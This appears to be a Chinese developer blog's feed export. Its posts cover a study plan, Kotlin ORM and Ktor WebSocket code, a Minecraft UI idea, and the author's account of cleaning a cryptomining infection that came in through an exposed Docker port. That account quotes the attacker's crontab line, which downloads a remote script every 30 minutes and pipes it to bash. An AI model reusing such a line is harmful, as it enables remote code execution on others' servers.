        <content type="html"><![CDATA[<h1 id="2022暑假学习计划"><a href="#2022暑假学习计划" class="headerlink" title="2022暑假学习计划"></a>2022暑假学习计划</h1><p>优先度按照顺序来</p><ul><li>JVM</li><li>Jetpack Compose</li><li>自定义View</li><li>React/Vue/Electron</li><li>Flutter</li><li>Go Web / Java NIO / Java Web</li></ul><p>没必要纠结Compose for Desktop / Compose for MultiPlatform，目前我认为桌面应用还是Electron来得快些。Electron有Web前端的生态，而Compose现在生态属实不太行。并且我认为我这段时间前端写得确实挺少，迫切的需要练习，如果开发桌面应用也使用前端的技术的话也能有更多机会磨练前端技术。</p>]]></content>
      
      
      <categories>
          
          <category> 计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习计划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次服务器遭到挖矿病毒感染的经历</title>
      <link href="/2022/05/17/deal-with-viruses-in-the-server/"/>
      <url>/2022/05/17/deal-with-viruses-in-the-server/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次服务器遭到挖矿病毒感染的经历"><a href="#记一次服务器遭到挖矿病毒感染的经历" class="headerlink" title="记一次服务器遭到挖矿病毒感染的经历"></a>记一次服务器遭到挖矿病毒感染的经历</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在鼓捣docker，看了一些教程，为了方便一些操作打开了2375端口，导致被人docker注入了。</p><h2 id="应对过程"><a href="#应对过程" class="headerlink" title="应对过程"></a>应对过程</h2><p>其实我之前完全没有面对过服务器遭到病毒攻击的问题…最开始是腾讯云给我发短信，说我的服务器存在危险行为，并且封禁了这台服务器一天。</p><p>当时一上去我就感觉到不对了，服务器上经常莫名奇妙多一个docker镜像，删了也没用。</p><p>后面我使用<code>crontab -l</code>排查了一下定时任务，发现里面有一个奇怪的任务。</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看样子这就是问题所在了，它会定时下载一个脚本文件并且执行。那么只要把它删掉不就完事大吉了？</p><p>于是我试图用<code>crontab -e</code>删掉它，最后却发现无法编辑这个配置。</p><blockquote><p>“/tmp/crontab.Awo30z” 1L, 1C written<br>crontab: installing new crontab<br>/var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted<br>crontab: edits left in /tmp/crontab.Awo30z</p></blockquote><p>病毒怎么可能会让你轻松的删掉这个定时任务？它修改了文件的属性，让它无法被修改——即便你拥有root的最高权限。</p><p>百度后找到了解决方案</p><blockquote><p> 查看是否有特殊的属性 lsattr /var/spool/cron/ </p><p> 去掉特殊的属性 chattr -ai /var/spool/cron/root  &amp;&amp; lsattr /var/spool/cron/root</p></blockquote><p>但是有一点很奇怪，我的腾讯云机器上无法使用chattr指令。他会询问我是否安装一个包，但真安装时却说这个包已经安装过了，不知道这是不是病毒搞得鬼。</p><blockquote><p>[root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron<br>bash: chattr: command not found…<br>Install package ‘e2fsprogs’ to provide command ‘chattr’? [N/y] y  </p><ul><li>Waiting in queue… Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed</li></ul></blockquote><p>于是我把包给卸载重装了一次，就可以了</p><blockquote><p>yum remove e2fsprogs-1.45.6-2.tl3.x86_64</p></blockquote><p>去除特殊权限后就可以编辑定时任务了。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为人生做些减法</title>
      <link href="/2022/02/23/do-some-subtraction-to-my-life/"/>
      <url>/2022/02/23/do-some-subtraction-to-my-life/</url>
      
        <content type="html"><![CDATA[<h1 id="为人生做些减法"><a href="#为人生做些减法" class="headerlink" title="为人生做些减法"></a>为人生做些减法</h1><blockquote><p>人生应当有所取舍，有所取也应有所舍</p></blockquote><p>最近发现自己想要的东西太多了。</p><p>当然我个人在物质上的追求一直维持在一个比较低的水平。但我对各种技术都相当感兴趣，并且希望能够学习他们，掌握他们。Android开发，Ktor，Vue，React…我贪心的想要全部掌握。乃至入学时同时成为了红岩网校三个部门的学员（虽然后面因为学业压力退了一个）。</p><p>这样做的代价是，我牺牲了我大学的正课的一些学习时间，牺牲了跟朋友一起打游戏的时间。我不后悔这样做，那段时间我过得十分的充实，但我发现我在Android和前端方面的技术进步都十分缓慢，并且我也逐渐力不从心了。<em><strong>也是，我不是什么超人，别人只能做好一件事，我凭什么认为我能同时做好两件？</strong></em></p><p>这样下去，两边的压力会把我两面的技术都拖垮。也许双线作战从根本上就是个错误。而我的大学生活也完全被学习技术这件事所吞噬，我应该放松下来，分出一部分时间去享受这段人生中最美好的时光。</p><p>那么也是做取舍的时候了，我的选择是深入钻研Android开发并以后以此为主业，而前端开发则作为爱好，在有空闲之时研究并不刻意做深入了解。</p><p>也希望这学期自己能够真正的做回自己，不要老是搞内卷让别人心慌，也不要看见别人内卷自己就心慌。<em><strong>没有意义，别人的不是我的，我也不需要比别人厉害，我只需关注自己的进步，跟着自己的步调前进就好了</strong></em>。</p>]]></content>
      
      
      <categories>
          
          <category> 人生感悟 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人生感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写了个Kotlin ORM框架</title>
      <link href="/2022/01/12/taboolib-orm/"/>
      <url>/2022/01/12/taboolib-orm/</url>
      
        <content type="html"><![CDATA[<h1 id="写了个Kotlin-ORM框架"><a href="#写了个Kotlin-ORM框架" class="headerlink" title="写了个Kotlin ORM框架"></a>写了个Kotlin ORM框架</h1><p>嘛，一直想写框架，又发现TabooLib的数据库虽然有跟ktorm比起来也不差的sql-dsl支持，但却缺少ORM的支持。</p><p>虽说直接用ktorm也不是不行，但这可是个绝佳的练手项目。我早八百年前就想写框架了。</p><h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p>一个框架也许最重要的就是它的设计，这将决定开发者用得爽不爽。事实证明，好用才是第一位，哪怕效率都得靠边站。</p><p><strong>开发效率第一</strong></p><p>于是为了设计好这个框架，我那天从凌晨1点构思到3点半，最终确定了一套个人觉得非常不错的设计</p><p>最开始借鉴了很多Android Jetpack Room的设计，然后结合实际情况改了不少，还顺带给TabooLib的DSL做了支持</p><p>如今感觉这套设计青出于蓝，甚至比Room更胜一筹 （个人感觉）</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">data</span> <span class="token keyword">class</span> <span class="token function">ExampleEntity</span><span class="token punctuation">(</span>    <span class="token comment">// PrimaryKey 不用写option</span>    <span class="token annotation builtin">@PrimaryKey</span><span class="token punctuation">(</span>autoGenerate <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token annotation builtin">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"id"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> ColumnTypeSQL<span class="token punctuation">.</span>INT<span class="token punctuation">)</span>    <span class="token keyword">val</span> id<span class="token operator">:</span> Int<span class="token operator">?</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>    <span class="token annotation builtin">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"type"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> ColumnTypeSQL<span class="token punctuation">.</span>TEXT<span class="token punctuation">,</span> options <span class="token operator">=</span> <span class="token punctuation">[</span>ColumnOptionSQL<span class="token punctuation">.</span>NOTNULL<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> type<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token annotation builtin">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"user"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> ColumnTypeSQL<span class="token punctuation">.</span>TEXT<span class="token punctuation">,</span> options <span class="token operator">=</span> <span class="token punctuation">[</span>ColumnOptionSQL<span class="token punctuation">.</span>NOTNULL<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> user<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token annotation builtin">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"user"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> ColumnTypeSQL<span class="token punctuation">.</span>TEXT<span class="token punctuation">,</span> def <span class="token operator">=</span> <span class="token string">"null"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span><span class="token keyword">interface</span> ExampleDAO <span class="token operator">:</span> IDao<span class="token operator">&lt;</span>ExampleEntity<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token annotation builtin">@Query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM {table}"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">queryAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> List<span class="token operator">&lt;</span>ExampleEntity<span class="token operator">&gt;</span>    <span class="token annotation builtin">@Insert</span>    <span class="token keyword">fun</span> <span class="token function">insert</span><span class="token punctuation">(</span>entity<span class="token operator">:</span> ExampleEntity<span class="token punctuation">)</span>        <span class="token annotation builtin">@Query</span><span class="token punctuation">(</span><span class="token string">"DELETE FROM {table}"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token annotation builtin">@Query</span><span class="token punctuation">(</span><span class="token string">"SELECT WHERE id &gt; {id} FROM {table}"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">querySome</span><span class="token punctuation">(</span>id<span class="token operator">:</span> Int<span class="token punctuation">)</span><span class="token operator">:</span> List<span class="token operator">&lt;</span>ExampleEntity<span class="token operator">&gt;</span>        <span class="token comment">// 使用TabooLib DSL语句控制</span>    <span class="token annotation builtin">@DSL</span>    <span class="token keyword">fun</span> <span class="token function">selectUser</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token operator">:</span> ExampleEntity<span class="token operator">?</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> table<span class="token punctuation">.</span><span class="token function">workspace</span><span class="token punctuation">(</span>datasource<span class="token punctuation">)</span> <span class="token punctuation">{</span>            select <span class="token punctuation">{</span> <span class="token keyword">where</span> <span class="token punctuation">{</span> <span class="token string">"user"</span> eq name <span class="token punctuation">}</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">firstOrNull</span> <span class="token punctuation">{</span>            <span class="token function">adaptResultSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">object</span> AppDatabase <span class="token punctuation">{</span>    <span class="token comment">/**     * 也可通过ORMBuilder#buildFromConf(ConfigurationSection, String)直接构建     */</span>    <span class="token keyword">private</span> <span class="token keyword">val</span> builder <span class="token keyword">by</span> lazy <span class="token punctuation">{</span>        ORMBuilder<span class="token punctuation">.</span><span class="token function">newBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">host</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">port</span><span class="token punctuation">(</span><span class="token number">3306</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token string">"database"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">buildHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>             <span class="token keyword">val</span> exampleTableDao <span class="token keyword">by</span> lazy <span class="token punctuation">{</span>        <span class="token comment">// 表名 DAO类</span>        builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token string">"exampleTable"</span> <span class="token punctuation">,</span>ExampleDAO<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><p>最开始其实我是想做成跨平台项目的，然后提供TabooLib的实现。</p><p>然后我发现说实话我对跨平台设计还不是特别了解，于是最后一气之下换成了TabooLib单平台实现。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>最开始其实我是完全没有头绪的，后面看了一下Room的使用方法，麻木的仿写出了一套写法</p><p>后来再看了一遍这个写法，联想到了Retrofit，然后想到了Retrofit的底层实现是动态代理</p><p>说实话以前没有用过动态代理，于是就去了解了一下子</p><p>最后发现这个项目的灵魂就在动态代理，而且其实代码量并不多</p><h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><ul><li>Kotlin接口方法默认实现不是基于JDK8以后的default关键字，而是在接口里生成了一个静态内部类以静态方法的形式存放</li><li>ResultSet应该以迭代器的方式使用</li><li>获取父类/接口的泛型应该使用genericSuperClass/Interfaces</li><li>返回值类型为void或Unit的方法的returnType不是Void::class.java,也不是Unit::class.java。但它可以用returnType.name == “void”这种形式进行判断</li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> MySQL </tag>
            
            <tag> TabooLib </tag>
            
            <tag> 动态代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个Minecraft Chest UI框架的灵感</title>
      <link href="/2022/01/07/a-idea-about-minecraft-ui/"/>
      <url>/2022/01/07/a-idea-about-minecraft-ui/</url>
      
        <content type="html"><![CDATA[<h1 id="一个Minecraft-Chest-UI框架的灵感"><a href="#一个Minecraft-Chest-UI框架的灵感" class="headerlink" title="一个Minecraft Chest UI框架的灵感"></a>一个Minecraft Chest UI框架的灵感</h1><p>我在想，Minecraft的GUI，是不是也可以沿用Compose的那套设计思路…</p><p>于是说干就干，我会放一些思路在下面</p><h2 id="一些Minecraft本土化措施"><a href="#一些Minecraft本土化措施" class="headerlink" title="一些Minecraft本土化措施"></a>一些Minecraft本土化措施</h2><p>当然不能搞教条主义，毕竟Minecraft GUI与Android UI之间差距不可谓不大，不可能照搬照抄。</p><h3 id="多平台实现"><a href="#多平台实现" class="headerlink" title="多平台实现"></a>多平台实现</h3><p>MinecraftCompose提供接口供其他开发者实现，同时提供一套基于TabooLib框架下的默认实现</p><p>如果你希望基于其他UI框架使用MinecraftCompose，可以自行实现</p><h3 id="Composable实现"><a href="#Composable实现" class="headerlink" title="@Composable实现"></a>@Composable实现</h3><p>我认为对我来说搞出@Composable那种效果有点不现实，那么我们便退而求其次，使用下面的方式达到函数组合的效果。</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> composeApi <span class="token operator">=</span> MinecraftCompose<span class="token punctuation">.</span><span class="token function">newAPIInst</span><span class="token punctuation">(</span>TabooLibImpl<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span><span class="token comment">// 为玩家打开UI</span><span class="token keyword">fun</span> <span class="token function">openFor</span><span class="token punctuation">(</span>player<span class="token operator">:</span> Player<span class="token punctuation">)</span> <span class="token punctuation">{</span>    composeApi<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>player<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/**this: ComposeScope **/</span>        <span class="token function">mainUI</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// Compose Function</span><span class="token keyword">fun</span> <span class="token function">mainUI</span><span class="token punctuation">(</span>scope<span class="token operator">:</span> ComposeScope<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">with</span><span class="token punctuation">(</span>scope<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 剩下的留着我之后想</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MVI思想"><a href="#MVI思想" class="headerlink" title="MVI思想"></a>MVI思想</h3><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> state <span class="token keyword">by</span> viewModel<span class="token punctuation">.</span>databaseFlow<span class="token punctuation">.</span><span class="token function">observeAsState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// ObserveAsState后,ComposeUI会随订阅的Flow更新而重构</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
            <tag> Compose </tag>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Ktor!</title>
      <link href="/2022/01/03/hello-ktor/"/>
      <url>/2022/01/03/hello-ktor/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Ktor"><a href="#Hello-Ktor" class="headerlink" title="Hello Ktor!"></a>Hello Ktor!</h1><blockquote><p>Ktor是JetBrains官方团队开发的一款基于Kotlin语言的后端框架</p><p>不同于Spring Boot牺牲性能换取开发效率的做法，在Kotlin语言优美的DSL语法与协程特性的加持下，Ktor兼顾了并发性能与开发效率</p><p>更为重要的是，作为一名使用Kotlin语言进行开发的Android开发者，同样使用大量Kotlin语言高级特性与协程的Ktor属实是我们走向全栈之路的不二法门呢</p></blockquote><p>其实接触这个主要是因为我用Spring Boot写的那个WebSocket无论如何都没法用OKHttp连上（浏览器就可以）</p><p>不多废话，直接贴代码，感受一下Kotlin DSL的优雅简洁</p><p><strong>Sockets.kt</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> logger <span class="token operator">=</span> LogManager<span class="token punctuation">.</span><span class="token function">getLogManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token string">"ChatRoom"</span><span class="token punctuation">)</span><span class="token keyword">val</span> gson<span class="token operator">:</span> Gson <span class="token operator">=</span> <span class="token function">GsonBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">fun</span> Application<span class="token punctuation">.</span><span class="token function">configureSockets</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">install</span><span class="token punctuation">(</span>WebSockets<span class="token punctuation">)</span> <span class="token punctuation">{</span>        pingPeriod <span class="token operator">=</span> Duration<span class="token punctuation">.</span><span class="token function">ofSeconds</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>        timeout <span class="token operator">=</span> Duration<span class="token punctuation">.</span><span class="token function">ofSeconds</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>        maxFrameSize <span class="token operator">=</span> Long<span class="token punctuation">.</span>MAX_VALUE        masking <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span>    routing <span class="token punctuation">{</span>        <span class="token keyword">val</span> connections <span class="token operator">=</span> Collections<span class="token punctuation">.</span>synchronizedSet<span class="token operator">&lt;</span>Connection<span class="token operator">?</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token function">LinkedHashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">webSocket</span><span class="token punctuation">(</span><span class="token string">"/chatroom"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// websocketSession</span>            <span class="token keyword">val</span> thisConnection <span class="token operator">=</span> <span class="token function">Connection</span><span class="token punctuation">(</span>                <span class="token keyword">this</span><span class="token punctuation">,</span>                call<span class="token punctuation">.</span>request<span class="token punctuation">.</span>queryParameters<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"nameless"</span><span class="token punctuation">,</span>                call<span class="token punctuation">.</span>request<span class="token punctuation">.</span>queryParameters<span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span>                    <span class="token operator">?:</span> <span class="token string">"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp"</span>            <span class="token punctuation">)</span>            connections <span class="token operator">+=</span> thisConnection            <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>name<span class="token delimiter variable">}</span></span> join with avatar: <span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>avatar<span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span>            connections<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>                it<span class="token punctuation">.</span>session<span class="token punctuation">.</span>outgoing<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>                    Frame<span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span>                        gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>                            <span class="token function">ChatMessageBean</span><span class="token punctuation">(</span>                                <span class="token string">"OPEN"</span><span class="token punctuation">,</span>                                thisConnection<span class="token punctuation">.</span>name<span class="token punctuation">,</span>                                <span class="token keyword">null</span><span class="token punctuation">,</span>                                thisConnection<span class="token punctuation">.</span>avatar                            <span class="token punctuation">)</span>                        <span class="token punctuation">)</span>                    <span class="token punctuation">)</span>                <span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>frame <span class="token keyword">in</span> incoming<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">when</span> <span class="token punctuation">(</span>frame<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">is</span> Frame<span class="token punctuation">.</span>Text <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>                            <span class="token keyword">val</span> text <span class="token operator">=</span> frame<span class="token punctuation">.</span><span class="token function">readText</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                            <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>name<span class="token delimiter variable">}</span></span> chat with avatar: <span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>avatar<span class="token delimiter variable">}</span></span> : <span class="token interpolation variable">$text</span>"</span><span class="token punctuation">)</span>                            connections<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>                                it<span class="token punctuation">.</span>session<span class="token punctuation">.</span>outgoing<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>                                    Frame<span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span>                                        gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>                                            <span class="token function">ChatMessageBean</span><span class="token punctuation">(</span>                                                <span class="token string">"MESSAGE"</span><span class="token punctuation">,</span>                                                thisConnection<span class="token punctuation">.</span>name<span class="token punctuation">,</span>                                                text<span class="token punctuation">,</span>                                                thisConnection<span class="token punctuation">.</span>avatar                                            <span class="token punctuation">)</span>                                        <span class="token punctuation">)</span>                                    <span class="token punctuation">)</span>                                <span class="token punctuation">)</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>  <span class="token keyword">catch</span> <span class="token punctuation">(</span>t<span class="token operator">:</span> Throwable<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>localizedMessage<span class="token punctuation">)</span>            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>                connections <span class="token operator">-=</span> thisConnection                <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>name<span class="token delimiter variable">}</span></span> exit with avatar: <span class="token interpolation"><span class="token delimiter variable">${</span>thisConnection<span class="token punctuation">.</span>avatar<span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ChatMessageBean</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">data</span> <span class="token keyword">class</span> <span class="token function">ChatMessageBean</span><span class="token punctuation">(</span>    <span class="token keyword">val</span> type<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">val</span> username<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>    <span class="token keyword">val</span> avatar<span class="token operator">:</span> String<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Connection</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> <span class="token function">Connection</span><span class="token punctuation">(</span><span class="token keyword">val</span> session<span class="token operator">:</span> DefaultWebSocketSession<span class="token punctuation">,</span> <span class="token keyword">val</span> name<span class="token operator">:</span> String<span class="token punctuation">,</span> <span class="token keyword">val</span> avatar<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">companion</span> <span class="token keyword">object</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> lastId <span class="token operator">=</span> <span class="token function">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Ktor </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Minecraft Forge &amp; Mixin!</title>
      <link href="/2021/12/30/hello-forge-and-mixin/"/>
      <url>/2021/12/30/hello-forge-and-mixin/</url>
      
